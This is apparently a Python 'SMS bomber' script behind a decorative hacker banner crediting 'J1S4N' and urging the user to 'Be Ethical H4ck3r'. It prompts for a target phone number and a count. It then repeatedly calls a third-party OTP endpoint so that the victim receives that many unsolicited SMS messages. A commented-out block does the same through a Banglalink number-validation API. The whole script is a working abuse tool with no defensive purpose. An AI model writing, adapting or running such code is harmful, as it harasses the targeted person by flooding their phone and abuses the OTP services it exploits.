import os
import sys
import time

os.system("clear")
print("\n\n\n\n\n")

ad = "           \033[32m         System loading..."

for c in ad:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.1)

time.sleep(1)
os.system("clear")
print("\n\n\n\n\n")

ad = "                    Successfully Loaded\n"
for c in ad:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.1)
#print("\n")
name = input("             \033[35m       Your Name:\033[00m ")
#print("\n")
ab =  "                   \033[36m Hello\033[34m "+ name + "\033[36m,  Be Ethical H4ck3r\033[00m\n"
for c in ab:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.1)

print("\n\n\n\n")
os.system("clear")
 #Raw string to avoid unicode issues
print("""\033[33m

   ___  __   _____  ___   _   _ 
  |_  |/  | /  ___|/ _ \ | \ | |
    | |`| | \ `--./ /_\ \|  \| |
    | | | |  `--. \  _  || . ` |
/\__/ /_| |_/\__/ / | | || |\  |
\____/ \___/\____/\_| |_/\_| \_/
                                
                                

\033[00m
\033[35m====================================
\033[31mOwner      : J1S4N
GitHub     : J1S4N
Facebook   : J1SAN
\033[35m====================================
""")
import requests

um = input("Enter your target number: ")
am = int(input("Enter amount: "))

sent = 0

headers = {
    "User-Agent": "Mozilla/5.0"
}
params = {}

while sent < am:#
    response = requests.get(f"https://apibeta.iqra-live.com/api/v2/sent-otp/{um}", headers=headers)
    if response.status_code == 200:
        sent += 1
        print(f"{sent} SMS sent ")
    else:
        print("Failed to send SMS ")

   # response = requests.get(
#        "https://web-api.banglalink.net/api/v1/user/number/validation/" + um,
#        params=params,
#        headers=headers,
#    )
#    if response.status_code == 200:
#        sent += 1
#        print(f"{sent} SMS sent ")
#    else:
#        print("Failed to send SMs ")